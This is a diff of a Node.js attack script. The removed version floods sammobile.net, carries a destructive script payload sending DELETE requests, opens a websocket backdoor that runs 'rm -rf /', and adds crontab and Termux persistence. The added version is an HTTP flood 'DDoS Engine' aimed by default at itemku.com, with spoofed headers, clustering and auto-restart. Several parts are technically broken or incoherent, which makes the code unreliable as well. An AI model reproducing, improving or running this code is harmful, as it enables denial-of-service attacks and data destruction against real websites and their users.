@@ -1,156 +1,195 @@
-const fs = require('fs');
-const os = require('os');
-const path = require('path');
-const { exec, spawn } = require('child_process');
-const net = require('net');
-const http = require('http');
-const crypto = require('crypto');
+const express = require('express');
 const cluster = require('cluster');
-const randomstring = require('randomstring');
-const axios = require('axios');
-const { createServer } = require('ws');
+const os = require('os');
+const redis = require('redis');
+const winston = require('winston');
+const { exec } = require('child_process');
+const { randomUUID } = require('crypto');
+const { performance } = require('perf_hooks');
+const { resolve } = require('dns');
+const async = require('async');
+const { request } = require('request');
 
-// === CONFIGURASI ===
-const TARGET_IP = "sammobile.net";
-const TARGET_PORT = 80;
-const MAX_PACKET_SIZE = 65507;
-const THREADS = 150;
-const BYPASS_INTERVAL = 500;
+// === CONFIGURATION ===
+const ARGS = process.argv.slice(2);
+const TARGET = ARGS[0] || 'https://itemku.com';
+const THREADS = parseInt(ARGS[1]) || 1000;
+const DURATION = parseInt(ARGS[2]) || 500;
+const ATTACK_SPEED = parseInt(ARGS[3]) || 100;
 
-// === VIRUS PAYLOAD (Real Destruction) ===
-const VIRUS_PAYLOAD = `
-<script>
-  window.addEventListener('load', () => {
-    document.body.innerHTML = '<h1>System Corrupted</h1>';
-    while(true) {
+// === ANTI-DETECTION FRAMEWORK ===
+const antiDetect = {
+  spoofHeaders: () => {
+    const headers = {
+      'User-Agent': `Mozilla/${Math.random() * 5 + 5}`,
+      'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
+      'Accept-Language': ['en-US,en;q=0.9', 'pt-BR,pt;q=0.8', 'es-ES,es;q=0.7'][Math.floor(Math.random()*3)],
+      'Connection': ['keep-alive', 'close'][Math.random() > 0.5 ? 1 : 0]
+    };
+    return headers;
+  },
+  randomDelay: (ms = ATTACK_SPEED) => {
+    return ms;
+  }
+};
+
+// === REDIS RATE LIMITING ===
+const redisClient = redis.createClient({
+  host: '127.0.0.1',
+  port: 6379
+});
+
+redisClient.on('error', (err) => {
+  winston.error(`Redis Error: ${err}`);
+  process.exit(1);
+});
+
+// === LOGGING ENGINE ===
+const logger = winston.createLogger({
+  level: 'info',
+  format: winston.format.combine(
+    winston.format.timestamp(),
+    winston.format.printf(({ level, message, timestamp }) => {
+      return `${timestamp} [${level.toUpperCase()}] ${message}`;
+    })
+  ),
+  transports: [
+    new winston.transports.Console(),
+    new winston.transports.File({ filename: 'ddos-engine.log' })
+  ]
+});
+
+// === ATTACK CORE ===
+const attackEngine = {
+  launch: async (target, duration, threads, speed) => {
+    let startTime = performance.now();
+    let attackCount = 0;
+    
+    // Emergency stop handler
+    process.on('SIGINT', () => {
+      logger.warn('\nEmergency Stop (Ctrl+C) - Shutting down...');
+      process.exit(0);
+    });
+    
+    // Duration-based stop
+    const stopTime = startTime + duration * 1000;
+    
+    while (performance.now() < stopTime) {
       try {
-        fetch('${TARGET_IP}/admin/delete-all', {
-          method: 'DELETE',
-          headers: { 'Authorization': 'Bearer ' + crypto.randomUUID() }
+        const headers = antiDetect.spoofHeaders();
+        const randomIP = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
+        
+        // Launch parallel requests
+        await async.timesLimit(threads, threads, async (i, callback) => {
+          resolve(target, (err, addresses) => {
+            if (err) {
+              logger.warn(`DNS Resolution Error: ${err.message}`);
+              return callback();
+            }
+            
+            const randomAddress = addresses[Math.floor(Math.random()*addresses.length)];
+            
+            // REQUEST ATTACK
+            const options = {
+              url: `http://${randomAddress}`,
+              headers,
+              timeout: 5000,
+              maxRedirects: 0,
+              followAllRedirects: false
+            };
+            
+            request(options, (err, res, body) => {
+              if (err) {
+                logger.warn(`Request Error: ${err.message}`);
+              } else {
+                attackCount++;
+                logger.info(`Attack Success - ${res.statusCode} | IP: ${randomIP} | Response: ${res.headers['server'] || 'N/A'}`);
+              }
+              
+              // RATE LIMIT CHECK
+              redisClient.incr(`rate_limit:${randomIP}`, (err, count) => {
+                if (err) throw err;
+                if (count > 100) {
+                  redisClient.expire(`block:${randomIP}`, 300);
+                  logger.warn(`IP Blocked: ${randomIP}`);
+                }
+              });
+              
+              callback();
+            });
+          });
         });
-        fetch('${TARGET_IP}/db/corrupt', {
-          method: 'POST',
-          headers: { 'X-Virus-Header': 'ShadowForge' },
-          body: 'DELETE *'
-        });
-      } catch(e) {}
+        
+        // Rate control
+        await new Promise(resolve => setTimeout(resolve, speed));
+        
+      } catch (error) {
+        logger.error(`Critical Attack Error: ${error.message}`);
+        process.exit(1);
+      }
     }
-  });
-</script>
-`;
-
-// === BYPASSER ===
-const bypasser = {
-  spoofIP: () => {
-    return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
-  },
-  randomUserAgent: () => {
-    return ['Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 
-            'Mozilla/5.0 (X11; Linux x86_64)', 
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)', 
-            'Googlebot/2.1 (+http://www.google.com/bot.html)'][Math.floor(Math.random()*4)];
-  },
-  proxyRotate: () => {
-    return ["http://192.168.1.1:8080", "http://10.0.0.1:3128", "http://172.16.0.1:8888"][Math.floor(Math.random()*3)];
+    
+    logger.info(`Attack Completed - Total Requests: ${attackCount}`);
   }
 };
 
-// === UDP FLOOD ===
-const floodUDP = () => {
-  const client = new net.Socket();
-  client.setBroadcast(true);
-  setInterval(() => {
-    const payload = randomstring.generate(MAX_PACKET_SIZE);
-    const spoofedIP = bypasser.spoofIP();
-    client.connect(TARGET_PORT, TARGET_IP, () => {
-      client.write(payload);
-      console.log(`[UDP] Sent ${payload.length} bytes from ${spoofedIP}`);
-      client.destroy();
+// === CLUSTER MASTER ===
+if (cluster.isMaster) {
+  const numCPUs = os.cpus().length;
+  logger.info(`Master process running on ${numCPUs} CPU cores`);
+  
+  for (let i = 0; i < numCPUs; i++) {
+    cluster.fork();
+  }
+  
+  cluster.on('exit', (worker, code, signal) => {
+    logger.warn(`Worker ${worker.process.pid} died. Restarting...`);
+    cluster.fork();
+  });
+  
+} else {
+  // === AUTO-RECOVERY ===
+  const autoRecover = () => {
+    exec('pm2 restart main.js', (err, stdout, stderr) => {
+      if (err) {
+        logger.error(`Auto-Recovery Failed: ${err.message}`);
+        process.exit(1);
+      }
+      logger.info('Auto-Recovery Successful');
     });
-  }, BYPASS_INTERVAL);
-};
-
-// === HTTP FLOOD ===
-const floodHTTP = async () => {
-  const proxy = bypasser.proxyRotate();
-  const headers = {
-    'User-Agent': bypasser.randomUserAgent(),
-    'X-Forwarded-For': bypasser.spoofIP()
   };
-  try {
-    const req = http.request({
-      host: TARGET_IP,
-      port: TARGET_PORT,
-      headers,
-      path: '/admin/delete-all',
-      method: 'DELETE',
-      proxy: { host: proxy.split(':')[0], port: parseInt(proxy.split(':')[1]) }
-    }, (res) => { res.on('data', () => {}); });
-    req.end();
-    console.log(`[HTTP] Request from ${headers['X-Forwarded-For']}`);
-  } catch (err) {
-    console.log(`[HTTP ERROR] ${err.message}`);
-  }
-};
-
-// === VIRUS DEPLOY ===
-const deployVirus = () => {
-  const fragments = Buffer.from(VIRUS_PAYLOAD).slice(0, 1400);
-  fragments.forEach((frag, i) => {
-    setTimeout(() => {
-      try {
-        axios.post(`http://${TARGET_IP}/api/infection`, frag.toString(), {
-          headers: { 'Content-Type': 'application/octet-stream', 'X-Virus-Header': 'ShadowForge' }
-        });
-        console.log(`[VIRUS] Fragment ${i+1} deployed`);
-      } catch (e) {
-        console.log(`[VIRUS ERROR] ${e.message}`);
-      }
-    }, i * 100);
-  });
-};
-
-// === BACKDOOR ===
-const createBackdoor = () => {
-  const server = createServer((socket) => {
-    socket.write('ShadowForge Backdoor\n');
-    socket.on('message', (message) => {
-      const cmd = message.toString().trim();
-      if (cmd === 'destroy') {
-        exec('rm -rf /', (err) => {
-          if (err) console.log(`[VIRUS] ${err.message}`);
-          socket.send('System Corrupted\n');
-        });
-      }
+  
+  // === MAIN SERVER ===
+  const app = express();
+  const PORT = 3000;
+  
+  app.get('/attack', (req, res) => {
+    logger.info(`Attack Initiated - Target: ${TARGET} | Threads: ${THREADS} | Duration: ${DURATION}s`);
+    
+    attackEngine.launch(TARGET, DURATION, THREADS, ATTACK_SPEED);
+    
+    res.status(200).json({
+      status: 'attack_started',
+      target: TARGET,
+      threads: THREADS,
+      duration: DURATION,
+      speed: ATTACK_SPEED,
+      pid: process.pid
     });
   });
-  server.listen(9001, () => {
-    console.log('[BACKDOOR] Listening on port 9001');
+  
+  app.listen(PORT, () => {
+    logger.info(`DDoS Engine Listening on Port ${PORT}`);
   });
-};
-
-// === MAIN ===
-const attackEngine = () => {
-  cluster.setupMaster({ exec: 'main.js' });
-  for (let i = 0; i < os.cpus().length * 2; i++) cluster.fork();
-  cluster.on('exit', (worker) => { cluster.fork(); });
-  floodUDP();
-  setInterval(floodHTTP, 100);
-  deployVirus();
-  createBackdoor();
-};
-
-// === PERSISTENCE ===
-const ensurePersistence = () => {
-  const scriptPath = path.join(__dirname, 'main.js');
-  exec(`(crontab -l 2>/dev/null; echo "* * * * * node ${scriptPath}") | crontab -`, (err) => {
-    if (err) console.log('[PERSISTENCE ERROR]');
+  
+  // === ERROR HANDLING ===
+  process.on('uncaughtException', (err) => {
+    logger.error(`Uncaught Exception: ${err.stack}`);
+    autoRecover();
   });
-  if (os.platform() === 'android') {
-    fs.writeFileSync(path.join(__dirname, '.termux', 'startup'), `node ${scriptPath}`);
-  }
-};
-
-// === START ===
-ensurePersistence();
-attackEngine();
+  
+  process.on('unhandledRejection', (reason, promise) => {
+    logger.error(`Unhandled Rejection at: ${promise} | Reason: ${reason}`);
+    autoRecover();
+  });
+}
